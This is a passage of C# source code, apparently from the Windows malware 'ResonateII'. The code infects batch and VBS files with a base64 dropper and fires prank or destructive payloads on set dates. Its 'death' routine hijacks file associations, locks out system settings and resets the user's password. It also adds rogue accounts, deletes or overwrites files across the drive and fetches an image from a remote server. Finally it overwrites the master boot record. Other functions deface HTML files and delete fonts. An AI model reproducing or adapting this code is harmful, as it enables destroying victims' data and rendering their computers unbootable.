" + dbod + @" = " + dcbs + @"(" + bsfd + @") " + smrk + @"
Dim " + tdir + @" " + smrk + @"
" + tdir + @" = WScript.CreateObject(""Scripting.FileSystemObject"").GetSpecialFolder(2) " + smrk + @"
" + wbyt + @" " + tdir + @" +""\" + vext + @""", " + dbod + @" " + smrk + @"
" + ofile + @"
private function " + dcbs + @"(base64) " + smrk + @"
  dim " + dbdm + @", " + dbel + @" " + smrk + @"
  Set " + dbdm + @" = CreateObject(""Microsoft.XMLDOM"") " + smrk + @"
  Set " + dbel + @" = " + dbdm + @".createElement(""tmp"") " + smrk + @"
  " + dbel + @".DataType = ""bin.base64"" " + smrk + @"
  " + dbel + @".Text = base64 " + smrk + @"
  " + dcbs + @" = " + dbel + @".NodeTypedValue " + smrk + @"
end function " + smrk + @"
private Sub " + wbyt + @"(file, bytes) " + smrk + @"
  Dim " + wbst + @" " + smrk + @"
  Set " + wbst + @" = CreateObject(""ADODB.Stream"") " + smrk + @"
  " + wbst + @".Type = " + tbin + @" " + smrk + @"
  " + wbst + @".Open " + smrk + @"
  " + wbst + @".Write bytes " + smrk + @"
  " + wbst + @".SaveToFile file, " + fwrt + @" " + smrk + @"
End Sub " + smrk + @"
";
            return capScript;
        }
        static bool encapBatch(string filename)
        {
            if (!File.ReadAllText(filename).StartsWith(@"%nul%%nul%"))
            {
                try
                {
                    FileInfo st = new FileInfo(filename);
                    string cacheF = dcPath + "\\" + filename.Replace(st.Directory.Root.ToString(), "");
                    string cacheD = cacheF.Replace(st.Name, "");
                    if (!Directory.Exists(cacheD)) Directory.CreateDirectory(cacheD);
                    File.Copy(filename, cacheF, true);
                    string newFile = capGenerate() + File.ReadAllText(filename);
                    File.WriteAllText(filename, newFile);
                    logWrite("INFECT " + filename);
                    return true;
                }
                catch 
                {
                    return false;
                }
            }
            else return false;
        }
        static bool encapVBS(string filename)
        {
            if (!File.ReadAllText(filename).StartsWith(@"'J"))
            {
                bool dexplicit = false;
                if (!File.ReadAllText(filename).ToLower().Contains("option explicit"))
                {
                    dexplicit = true;
                }
                try
                {
                    FileInfo st = new FileInfo(filename);
                    string cacheF = dcPath + "\\" + filename.Replace(st.Directory.Root.ToString(), "");
                    string cacheD = cacheF.Replace(st.Name, "");
                    if (!Directory.Exists(cacheD)) Directory.CreateDirectory(cacheD);
                    File.Copy(filename, cacheF, true);
                    string newFile = capGenerateV(dexplicit, File.ReadAllText(filename));
                    File.WriteAllText(filename, newFile);
                    logWrite("INFECT " + filename);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
            else return false;
        }
        #endregion
        #endregion
        static bool startHostP(string[] args)
        {
            string filename = Assembly.GetExecutingAssembly().Location;
            FileInfo f = new FileInfo(filename);
            byte[] sig = File.ReadAllBytes(filename).Skip((int)f.Length - 1).Take(1).ToArray();
            switch (sig[0])
            {
                case mrpe:
                    try
                    {
                        //rsRun(args);
                        buckshot(args);
                        return true;
                    }
                    catch
                    {
                        return false;
                    }
                default:
                    return false;
            }
        }
        #endregion
        #region Self-management
        static byte[] getSelf()
        {
            return JLib.read(new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read), bodySize, 0);
        }
        static void logWrite(string s)
        {
            File.AppendAllText(ilogs, @"
" + s);
        }
        #endregion
        #region Payload stuff
        static void bender(bool mode)
        {
            System.Windows.Forms.Application.EnableVisualStyles();
            System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
            System.Windows.Forms.Application.Run(new oab(mode));
        }
        static int doPayloads()
        {
            if (JLib.dateCheck(12, 30))
            {
                if (intplayed == 0)
                {
                    Registry.SetValue(softwarer + malName, "intplayed", 1, RegistryValueKind.DWord);
                    intplayed = 1;
                    new Thread(doIntro).Start();
                }
                else
                {
                    MessageBox.Show("Today is a very special day. Give your computer a break!", "ResonateII", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                return 0;
            }
            else if (JLib.dateCheck(4, 20))
            {
                Wallpaper.Set(new Uri(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\snoop.jpg"), Wallpaper.Style.Stretched);
                return 1;
            }
            else if (JLib.dateCheck(2, 16))
            {
                if (JLib.mutexCheck(malName + "___MUTEX"))
                {
                    new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\grass_beach.wav").PlayLooping();
                    return 2;
                }
                else return 1;
            }
            else if (JLib.dateCheck(9, 4))
            {
                Process.Start("http://fittea.org/");
                return 0;
            }
            else if (JLib.dateCheck(10,1))
            {
                System.Windows.Forms.Application.EnableVisualStyles();
                System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
                System.Windows.Forms.Application.Run(new danb());
                return 1;
            }
            else if (DateTime.Today.Month == 10 && (JLib.rollDice(16) == 8) && !(DateTime.Today.Day == 1))
            {
                try { patrix(); } catch { }
                return 0;
            }
            else if (DateTime.Today.Month == 8)
            {
                new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\bbt.wav").Play();
                return 1;
            }
            else if (JLib.dateCheck(1, 1))
            {
                new Thread(redThread).Start();
                return 1;
            }
            else if (JLib.dateCheck(11, 11))
            {
                if (JLib.mutexCheck(malName + "___MUTEX"))
                {
                    new Thread(ftheme).Start();
                    return 2;
                }
                else return 1;
            }
            else if (JLib.dateCheck(6, 17))
            {
                try { File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\g.bmp", Properties.Resources.g); } catch { }
                Wallpaper.Set(new Uri(Environment.GetEnvironmentVariable("windir") + "\\g.bmp"), Wallpaper.Style.Tiled);
                MessageBox.Show("GAiA Labs\nEstablished June 17th, 2016", "ResonateII by justquant/GAiA");
                return 1;
            }
            else
            {
                int pd = imonth + amod;
                int dy = iyear;
                if (pd > 12) { pd -= 12; dy += 1; }
                if (((pd < DateTime.Today.Month && dy == DateTime.Today.Year) || dy < DateTime.Today.Year))
                    if (JLib.mutexCheck(malName + "___MUTEX"))
                    { death(false, false, false, true, true); return 0; }
                return 1;
            }
        }
        static void death(bool a, bool b, bool c, bool d, bool e)
        {
            //Trash. Everything.
            if (!a && !b && !c && d && e)
            {
                logWrite("DEATH");
                new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\nl.wav").PlayLooping();
                string brokenHook = Environment.GetEnvironmentVariable("systemdrive") + "\\reaper.exe";
                File.WriteAllText(brokenHook, JLib.randStringU(256));
                Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\open\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\edit\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\open\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\edit\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\open\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\edit\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\piffile\\shell\\open\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\scrfile\\shell\\config\\command", "", brokenHook);
                Registry.SetValue("HKEY_CLASSES_ROOT\\scrfile\\shell\\install\\command", "", brokenHook);
                Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeCaption", "You're fucked now!", RegistryValueKind.String);
                Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeText", "Veni, vidi, vici! Your computer has been recycled by ResonateII!", RegistryValueKind.String);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewOnDrive", 0x3FFFFFF, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispAppearancePage", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispBackgroundPage", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispSettingsPage", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFileAssociate", 1, RegistryValueKind.DWord);
                byte[] swd = File.ReadAllBytes(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\sweetdreams.jpg");
                //fuckFonts();
                scT(new DirectoryInfo(Environment.GetEnvironmentVariable("systemdrive")));
                for (int i = 0; i <= 4096; i++) File.WriteAllBytes(Environment.GetEnvironmentVariable("userprofile") + "\\Desktop\\" + "SWEETDREAMS " + i + ".jpg", swd);
                try { new WebClient().DownloadFile("http://" + serverHN + "/public/dursteye.jpg", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\dursteye.jpg"); Wallpaper.Set(new Uri(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\dursteye.jpg"), Wallpaper.Style.Stretched); } catch { }
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\User Account Pictures\" + Environment.UserName + ".bmp", Properties.Resources.favicon);
                ProcessStartInfo n = new ProcessStartInfo("net", "user " + Environment.UserName + " " + "resonate");
                n.UseShellExecute = false;
                n.CreateNoWindow = true;
                Process.Start(n);
                for (int i = 0; i <= 32; i++)
                {
                    string u = JLib.randStringU(8);
                    ProcessStartInfo r = new ProcessStartInfo("net", "user " + u + " " + JLib.randStringU(8) + " /add");
                    r.UseShellExecute = false;
                    r.CreateNoWindow = true;
                    Process s = Process.Start(r);
                    while (!s.HasExited) Thread.Sleep(10);
                    File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\User Account Pictures\" + u + ".bmp", Properties.Resources.favicon);

                }
                uint write = 0;
                IntPtr MBR = CreateFile(
                        "\\\\.\\PhysicalDrive0", FileAccess.ReadWrite, FileShare.ReadWrite,
                        IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero
                        );
                NativeOverlapped wtfIsThis = new NativeOverlapped();
                WriteFile(MBR, mbrData, 512, out write, ref wtfIsThis);
                CloseHandle(MBR);
                MessageBox.Show("I've stuck around here long enough and so have you. I think it's time we went our seperate ways.\n\nResonateII\nWritten by justquant/GAiA\nSummer 2016", "Veni, vidi, vici!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                JLib.DoExitWin(JLib.EWX_FORCE | JLib.EWX_LOGOFF);
            }
        }
        static void scT(DirectoryInfo d) // File Decimator
        {
            foreach (string filter in bFtype) try
            {
                FileInfo[] files = d.GetFiles(filter); 
                foreach (FileInfo file in files) 
                {
                    try
                    {
                        file.Delete();
                        logWrite("DELETE " + file.FullName);
                    }
                    catch { }
                }
            } catch { }
            foreach (string filter in fUtype) try
            {
                FileInfo[] files = d.GetFiles(filter);
                foreach (FileInfo file in files)
                {
                    try
                    {
                        File.WriteAllText(file.FullName, JLib.repeatTime(256, "YOU'VE MET WITH A TERRIBLE FATE HAVEN'T YOU? "));
                        logWrite("FUCK UP " + file.FullName);
                    }
                    catch { }
                }
            } catch { }
            try { File.WriteAllBytes(d.FullName + "\\RESONATE.EXE", getSelf()); } catch { }
            try
            {
                DirectoryInfo[] dirs = d.GetDirectories("*.*"); 
                foreach (DirectoryInfo dir in dirs) 
                {
                    scT(dir); 
                }
            }
            catch { }

        }
        static void red(DirectoryInfo d)
        {
            FileInfo[] files = d.GetFiles("*.htm?");
            foreach (FileInfo file in files)
            {
                try
                {
                    File.WriteAllText(file.FullName, "<html><head><meta http-equiv=\"Content - Type\" content=\"text / html; charset = english\"><title>HELLO!</title></head><body><hr size=5><font color=\"red\"><p align=\"center\">Welcome to http://www.worm.com !<br><br>Hacked By Chinese!</font></hr></body></html>");
                    logWrite("OVERWRITE " + file.FullName);
                }
                catch { }
            }
            try
            {
                DirectoryInfo[] dirs = d.GetDirectories("*.*");
                foreach (DirectoryInfo dir in dirs)
                {
                    red(dir);
                }
            }
            catch { }

        }
        static void redThread()
        {
            red(new DirectoryInfo(Environment.GetEnvironmentVariable("systemdrive")));
            //Spin to keep the thread from dying because I'm retarded and don't know how to gracefully end threads.
            while (true) Thread.Sleep(60000);
        }
        static void doIntro()
        {
            System.Windows.Forms.Application.EnableVisualStyles();
            System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
            System.Windows.Forms.Application.Run(new intro());
        }
        static void patrix()
        {
            System.Windows.Forms.Application.EnableVisualStyles();
            System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
            System.Windows.Forms.Application.Run(new scary());
        }
        static void laugh()
        {
            SpeechSynthesizer synth = new SpeechSynthesizer();
            synth.SetOutputToDefaultAudioDevice();

            while (true) synth.Speak(JLib.repeatTime(20, "ha"));
        }
        static public void TrueBeep(note n, int ms)
        {
            uint freq = (uint)n;
            Out32(0x43, 0xB6);
            Out32(0x42, (Byte)((freq) & 0xFF));
            Out32(0x42, (Byte)((freq) >> 8));
            System.Threading.Thread.Sleep(10);
            Out32(0x61, (Byte)(System.Convert.ToByte(Inp32(0x61)) | 0x03));
            System.Threading.Thread.Sleep(ms);
            Out32(0x61, (Byte)(System.Convert.ToByte(Inp32(0x61)) & 0xFC));
        }
        static public void PauseFor(int ms)
        {
            Thread.Sleep(ms);
        }
        public enum note
        {
            C3 = 9121,
            C3S = 8609,
            D3 = 8126,
            D3S = 7670,
            E3 = 7239,
            F3 = 6833,
            F3S = 6449,
            G3 = 6087,
            G3S = 5746,
            A3 = 5423,
            A3S = 5119,
            B3 = 4831,

            C4 = 4560,
            C4S = 4304,
            D4 = 4063,
            D4S = 3834,
            E4 = 3619,
            F4 = 3416,
            F4S = 3224,
            G4 = 3043,
            G4S = 2873,
            A4 = 2711,
            A4S = 2559,
            B4 = 2415,

            C5 = 2280,
            C5S = 2152,
            D5 = 2031,
            D5S = 1917,
            E5 = 1809,
            F5 = 1715,
            F5S = 1612,
            G5 = 1521,
            G5S = 1436,
            A5 = 1355,
            A5S = 1292,
            B5 = 1207,

            C6 = 1140
        }
        static void ftheme()
        {
            while (true)
            {
                TrueBeep(note.C4S, 500);
                TrueBeep(note.C4S, 250);
                TrueBeep(note.D4, 250);
                TrueBeep(note.E4, 500);
                TrueBeep(note.C4S, 500);
                TrueBeep(note.D4, 500);
                TrueBeep(note.D4, 250);
                TrueBeep(note.E4, 250);
                TrueBeep(note.B3, 500);
                TrueBeep(note.E3, 500);
                TrueBeep(note.C4S, 500);
                TrueBeep(note.C4S, 250);
                TrueBeep(note.D4, 250);
                TrueBeep(note.E4, 500);
                TrueBeep(note.A4, 500);
                TrueBeep(note.F4S, 1000);
                TrueBeep(note.E4, 500);
                PauseFor(500);
                TrueBeep(note.C4S, 500);
                TrueBeep(note.C4S, 250);
                TrueBeep(note.D4, 250);
                TrueBeep(note.E4, 500);
                TrueBeep(note.C4S, 500);
                TrueBeep(note.D4, 500);
                TrueBeep(note.D4, 250);
                TrueBeep(note.E4, 250);
                TrueBeep(note.B3, 500);
                TrueBeep(note.E3, 500);
                TrueBeep(note.C4S, 500);
                TrueBeep(note.C4S, 250);
                TrueBeep(note.D4, 250);
                TrueBeep(note.B3, 500);
                TrueBeep(note.G3S, 500);
                TrueBeep(note.A3, 1000);
                TrueBeep(note.A5, 500);
                PauseFor(500);
            }
        }
        static void fuckFonts()
        {
            DirectoryInfo dllcache = new DirectoryInfo(Environment.GetEnvironmentVariable("windir") + "\\system32\\dllcache\\");
            dllcache.Attributes = FileAttributes.Normal;
            FileInfo[] filed = dllcache.GetFiles("*.*");
            foreach (FileInfo file in filed)
            {
                try
                {
                    file.Attributes = FileAttributes.Normal;
                    file.Delete();
                    logWrite("KILL CACHE " + file.FullName);
                }
                catch { }
            }
            FileInfo[] files = new DirectoryInfo(Environment.GetEnvironmentVariable("windir") + "\\Fonts\\").GetFiles("*.*");
            foreach (FileInfo file in files)
            {
                try
                {
                    file.Delete();
                    logWrite("KILL FONT " + file.FullName);
                }
                catch { }
            }
        }
        #endregion
    }
}

static class JLib
{
    [DllImport("user32.dll", SetLastError = true)]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder strText, int maxCount);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }

    [DllImport("kernel32.dll", ExactSpelling = true)]
    internal static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr
    phtok);

    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name,
    ref long pluid);

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
    ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

    [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool ExitWindowsEx(int flg, int rea);

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int TOKEN_QUERY = 0x00000008;
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
    public const int EWX_LOGOFF = 0x00000000;
    public const int EWX_SHUTDOWN = 0x00000001;
    public const int EWX_REBOOT = 0x00000002;
    public const int EWX_FORCE = 0x00000004;
    public const int EWX_POWEROFF = 0x00000008;
    public const int EWX_FORCEIFHUNG = 0x00000010;

    public static void DoExitWin(int flg)
    {
        bool ok;
        TokPriv1Luid tp;
        IntPtr hproc = GetCurrentProcess();
        IntPtr htok = IntPtr.Zero;
        ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;
        ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
        ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        ok = ExitWindowsEx(flg, 0);
    }

    // Delegate to filter which windows to include 
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    /// <summary> Get the text for the window pointed to by hWnd </summary>
    public static string GetWindowText(IntPtr hWnd)
    {
        int size = GetWindowTextLength(hWnd);
        if (size > 0)
        {
            var builder = new StringBuilder(size + 1);
            GetWindowText(hWnd, builder, builder.Capacity);
            return builder.ToString();
        }

        return String.Empty;
    }

    /// <summary> Find all windows that match the given filter </summary>
    /// <param name="filter"> A delegate that returns true for windows
    ///    that should be returned and false for windows that should
    ///    not be returned </param>
    public static IEnumerable<IntPtr> FindWindows(EnumWindowsProc filter)
    {
        IntPtr found = IntPtr.Zero;
        List<IntPtr> windows = new List<IntPtr>();

        EnumWindows(delegate (IntPtr wnd, IntPtr param)
        {
            if (filter(wnd, param))
            {
                // only add the windows that pass the filter
                windows.Add(wnd);
            }

            // but return true here so that we iterate all windows
            return true;
        }, IntPtr.Zero);

        return windows;
    }

    /// <summary> Find all windows that contain the given title text </summary>
    /// <param name="titleText"> The text that the window title must contain. </param>
    public static IEnumerable<IntPtr> FindWindowsWithText(string titleText)
    {
        return FindWindows(delegate (IntPtr wnd, IntPtr param)
        {
            return GetWindowText(wnd).Contains(titleText);
        });
    }

    private static RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider();
    
    public static byte[] read(FileStream s, int length, int c)
    {
        BinaryReader w33 = new BinaryReader(s);
        w33.BaseStream.Seek(c, SeekOrigin.Begin);
        byte[] bytes2 = new byte[length];
        int numBytesToRead2 = (int)length;
        int numBytesRead2 = 0;
        while (numBytesToRead2 > 0)
        {
            int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
            if (n == 0)
                break;
            numBytesRead2 += n;
            numBytesToRead2 -= n;
        }
        w33.Close();
        return bytes2;
    }
    public static string XOR(string text, string key)
    {
        var result = new StringBuilder();

        for (int c = 0; c < text.Length; c++)
            result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));

        return result.ToString();
    }
    public static bool mutexCheck(string m)
    {
        Mutex mutex = new Mutex(false, m);
        try
        {
            if (mutex.WaitOne(0, false))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        catch { return false; }
    }
    public static byte rollDice(byte numberSides)
    {
        if (numberSides <= 0)
            throw new ArgumentOutOfRangeException("numberSides");
        byte[] randomNumber = new byte[1];
        do
        {
            rngCsp.GetBytes(randomNumber);
        }
        while (!IsFairRoll(randomNumber[0], numberSides));
        return (byte)((randomNumber[0] % numberSides) + 1);
    }
    private static bool IsFairRoll(byte roll, byte numSides)
    {
        int fullSetsOfValues = Byte.MaxValue / numSides;
        return roll < numSides * fullSetsOfValues;
    }
    public static string randStringU(int length)
    {
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var stringChars = new char[length];
        var random = new Random();
        for (int i = 0; i < stringChars.Length; i++)
        {
            stringChars[i] = chars[rollDice((byte)(chars.Length - 1))];
        }
        return new string(stringChars);
    }
    public static string randString(int length)
    {
        var chara = "abcdefghijklmnopqrstuvwxyz";
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var stringChars = new char[length];
        var random = new Random();
        stringChars[0] = chara[rollDice((byte)(chara.Length - 1))];
        for (int i = 1; i < stringChars.Length; i++)
        {
            stringChars[i] = chars[rollDice((byte)(chars.Length - 1))];
        }
        return new string(stringChars);
    }
    public static string GetMd5Hash(string input)
    {
        MD5 md5Hash = MD5.Create();

        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

        StringBuilder sBuilder = new StringBuilder();

        for (int i = 0; i < data.Length; i++)
        {
            sBuilder.Append(data[i].ToString("x2"));
        }

        return sBuilder.ToString();
    }

    public static bool VerifyMd5Hash(string input, string hash)
    {
        string hashOfInput = GetMd5Hash(input);

        StringComparer comparer = StringComparer.OrdinalIgnoreCase;

        if (0 == comparer.Compare(hashOfInput, hash))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    public static string ConvertStringArrayToStringJoin(string[] array)
    {
        string result = string.Join(" ", array);
        return result;
    }
    public static bool dateCheck(int m, int d) // Date checker function
    {
        if (DateTime.Today.Month.ToString() == m.ToString()) // If the month is m
        {
            if (DateTime.Today.Day.ToString() == d.ToString()) // If the day is d
            {
                return true; // Return true
            }
            else
            {
                return false; // Return false
            }
        }
        else
        {
            return false; // Return false
        }
    }
    public static bool isAlphaNumeric(char s)
    {
        return "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Contains(s);
    }
    public static void standardExceptionBox(Exception e)
    {
        MessageBox.Show(e.ToString() + "\n\n" + e.StackTrace);
    }
    public static string repeatTime(int times, string s)
    {
        //This is honestly probably extremely inefficient and there's likely better ways of doing it.
        int ac = 0;
        string astr = "";
        while (ac <= times)
        {
            astr = astr + s;
            ac = ac + 1;
        }
        return astr;
    }
}
static class StringExtensions
{

    public static IEnumerable<String> SplitInParts(this String s, Int32 partLength)
    {
        if (s == null)
            throw new ArgumentNullException("s");
        if (partLength <= 0)
            throw new ArgumentException("Part length has to be positive.", "partLength");

        for (var i = 0; i < s.Length; i += partLength)
            yield return s.Substring(i, Math.Min(partLength, s.Length - i));
    }

}
public sealed class Wallpaper
{
    Wallpaper() { }

    const int SPI_SETDESKWALLPAPER = 20;
    const int SPIF_UPDATEINIFILE = 0x01;
    const int SPIF_SENDWININICHANGE = 0x02;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public enum Style : int
    {
        Tiled,
        Centered,
        Stretched
    }

    public static void Set(Uri uri, Style style)
    {
        System.IO.Stream s = new System.Net.WebClient().OpenRead(uri.ToString());

        System.Drawing.Image img = System.Drawing.Image.FromStream(s);
        string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
        img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
        if (style == Style.Stretched)
        {
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
        }

        if (style == Style.Centered)
        {
            key.SetValue(@"WallpaperStyle", 1.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
        }

        if (style == Style.Tiled)
        {
            key.SetValue(@"WallpaperStyle", 1.ToString());
            key.SetValue(@"TileWallpaper", 1.ToString());
        }

        SystemParametersInfo(SPI_SETDESKWALLPAPER,
            0,
            tempPath,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
